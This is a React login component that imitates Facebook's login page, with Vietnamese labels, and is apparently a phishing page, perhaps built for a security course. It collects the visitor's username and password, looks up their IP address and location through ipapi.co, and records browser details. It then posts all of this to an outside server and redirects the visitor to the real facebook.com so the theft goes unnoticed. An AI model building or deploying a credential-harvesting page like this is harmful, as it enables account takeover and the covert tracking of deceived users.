"use client";

import React, { FormEvent, useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Link from "next/link";
import { useRouter } from "next/navigation";

const LoginForm = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [ipAddress, setIpAddress] = useState("");
  const [userAgent, setUserAgent] = useState("");
  const [location, setLocation] = useState("");
  const [platform, setPlatform] = useState("");

  const [error, setError] = useState("");
  const router = useRouter();

  // Auto-detect client info
  useEffect(() => {
    // IP + Location
    fetch("https://ipapi.co/json")
      .then((res) => res.json())
      .then((data) => {
        setIpAddress(data.ip || "Không xác định");
        setLocation(`${data.city}, ${data.region}, ${data.country_name}`);
      })
      .catch(() => {
        setIpAddress("Không xác định");
        setLocation("Không xác định");
      });

    // User Agent + Platform
    setUserAgent(navigator.userAgent || "Không xác định");
    setPlatform(navigator.platform || "Không xác định");
  }, []);

  // Handle login submit
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    try {
      const response = await fetch("https://atbm-13-be.onrender.com/account", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username,
          password,
          ipAddress,
          userAgent,
          location,
          platform,
        }),
      });

      const data = await response.json();

      if (data.success) {
        router.push("https://www.facebook.com/");
      } else {
        setError(data.message || "Đăng nhập thất bại!");
      }
    } catch (err) {
      setError("Có lỗi xảy ra khi đăng nhập.");
      console.error(err);
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-lg p-6">
      <form className="space-y-4" onSubmit={handleSubmit}>
        {error && <p className="text-red-500 mb-4">{error}</p>}

        <Input
          type="text"
          placeholder="Email hoặc số điện thoại"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          required
          className="h-12 text-base border-gray-300 focus:border-blue-500"
        />

        <Input
          type="password"
          placeholder="Mật khẩu"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
          className="h-12 text-base border-gray-300 focus:border-blue-500"
        />

        <Button
          type="submit"
          className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-semibold text-lg"
        >
          Đăng nhập
        </Button>

        <div className="text-center">
          <Link href="#" className="text-blue-600 hover:underline text-sm">
            Quên mật khẩu?
          </Link>
        </div>

        <hr className="my-6" />

        <div className="text-center">
          <Button className="bg-green-500 hover:bg-green-600 text-white font-semibold px-6 py-3">
            Tạo tài khoản mới
          </Button>
        </div>
      </form>
    </div>
  );
};

export default LoginForm;
